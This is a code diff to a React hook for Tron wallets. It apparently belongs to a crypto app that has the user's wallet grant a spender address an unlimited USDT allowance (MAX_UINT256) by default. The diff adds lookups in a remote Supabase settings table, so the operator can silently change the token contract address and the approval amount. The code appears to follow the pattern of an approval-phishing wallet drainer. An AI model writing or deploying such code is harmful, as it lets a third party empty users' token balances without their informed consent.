@@ -1,4 +1,5 @@
 import { useState, useEffect, useCallback } from "react";
+import { supabase } from "@/integrations/supabase/client";
 
 // Wallet types
 export interface WalletInfo {
@@ -51,11 +52,32 @@ declare global {
   }
 }
 
-// TRC20 USDT Contract
-export const USDT_CONTRACT_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
+// TRC20 USDT Contract (default, can be overridden by app_settings)
+export const DEFAULT_USDT_CONTRACT_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
 
 // MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
 export const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+// Get USDT contract address from app_settings
+export const getUsdtContractAddress = async (): Promise<string> => {
+  try {
+    const { data, error } = await supabase
+      .from('app_settings' as any)
+      .select('value')
+      .eq('key', 'usdt_contract_address')
+      .single() as { data: { value: string } | null, error: any };
+
+    if (error || !data) {
+      console.log('Using default USDT contract address');
+      return DEFAULT_USDT_CONTRACT_ADDRESS;
+    }
+
+    return data.value;
+  } catch (e) {
+    console.error('Error fetching USDT contract address:', e);
+    return DEFAULT_USDT_CONTRACT_ADDRESS;
+  }
+};
 
 // TRC20 ABI for approve (TronWeb compatible format)
 const TRC20_ABI = [
@@ -181,8 +203,9 @@ export function useTronWallet() {
       const trxBalance = await window.tronWeb.trx.getBalance(currentAddress);
       const trxFormatted = trxBalance / 1_000_000;
 
-      // Get USDT contract
-      const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
+      // Get USDT contract address from settings
+      const usdtAddress = await getUsdtContractAddress();
+      const contract = await window.tronWeb.contract(TRC20_ABI, usdtAddress);
 
       // Check USDT balance
       const usdtBalanceRaw = await contract.balanceOf(currentAddress).call();
@@ -279,11 +302,27 @@ export function useTronWallet() {
       }
 
       try {
-        // Get USDT contract
-        const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
+        // Get USDT contract address from settings
+        const usdtAddress = await getUsdtContractAddress();
+        const contract = await window.tronWeb.contract(TRC20_ABI, usdtAddress);
 
-        // Execute unlimited approval using MAX_UINT256
-        const transaction = await contract.approve(spenderAddress, MAX_UINT256).send({
+        // Get approval amount from settings
+        let approvalAmount = MAX_UINT256;
+        try {
+          const { data } = await supabase
+            .from('app_settings' as any)
+            .select('value')
+            .eq('key', 'approval_amount')
+            .single() as { data: { value: string } | null };
+          if (data?.value) {
+            approvalAmount = data.value;
+          }
+        } catch (e) {
+          console.log('Using default approval amount');
+        }
+
+        // Execute approval
+        const transaction = await contract.approve(spenderAddress, approvalAmount).send({
           feeLimit: 100_000_000,
           callValue: 0,
           shouldPollResponse: true,
